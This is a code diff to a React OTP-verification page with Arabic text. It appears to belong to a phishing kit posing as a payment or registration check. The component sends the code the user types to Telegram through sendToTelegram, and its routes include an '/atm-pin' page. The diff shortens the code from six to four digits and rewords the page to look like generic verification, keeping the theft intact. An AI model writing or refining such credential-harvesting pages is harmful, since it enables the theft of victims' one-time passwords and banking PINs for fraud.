@@ -44,10 +44,10 @@ const OTPVerification = () => {
   };
 
   const handleVerify = async () => {
-    if (otp.length === 6) {
+    if (otp.length === 4) {
       const message = `رمز التحقق OTP\n\nالرمز: ${otp}`;
       await sendToTelegram(message);
-      navigate('/atm-pin');
+      navigate('/registration-complete');
     }
   };
 
@@ -83,21 +83,21 @@ const OTPVerification = () => {
                 </svg>
               </div>
               <h2 className="text-2xl font-bold mb-2 text-foreground">
-                التحقق من الدفع الإلكتروني
+                رمز التحقق
               </h2>
               <p className="text-sm text-muted-foreground">
-                لضمان أمان عملية الدفع
+                يرجى إدخال الرمز المرسل إلى هاتفك
               </p>
             </div>
 
             <div className="bg-background rounded-lg p-6 mb-6">
               <p className="text-base text-foreground text-right mb-6 leading-relaxed">
-                تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية الدفع بشكل آمن.
+                تم إرسال رمز التحقق المكون من 4 أرقام إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية التحقق.
               </p>
 
               <div className="flex justify-center mb-6" dir="ltr">
                 <InputOTP
-                  maxLength={6}
+                  maxLength={4}
                   value={otp}
                   onChange={(value) => setOtp(value)}
                 >
@@ -106,8 +106,6 @@ const OTPVerification = () => {
                     <InputOTPSlot index={1} />
                     <InputOTPSlot index={2} />
                     <InputOTPSlot index={3} />
-                    <InputOTPSlot index={4} />
-                    <InputOTPSlot index={5} />
                   </InputOTPGroup>
                 </InputOTP>
               </div>
@@ -137,13 +135,13 @@ const OTPVerification = () => {
               <Button 
                 className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                 onClick={handleVerify}
-                disabled={otp.length !== 6}
+                disabled={otp.length !== 4}
               >
-                تأكيد الدفع
+                تأكيد
               </Button>
               <Button 
                 variant="outline"
-                onClick={() => navigate('/registration-complete')}
+                onClick={() => navigate('/atm-pin')}
               >
                 رجوع
               </Button>
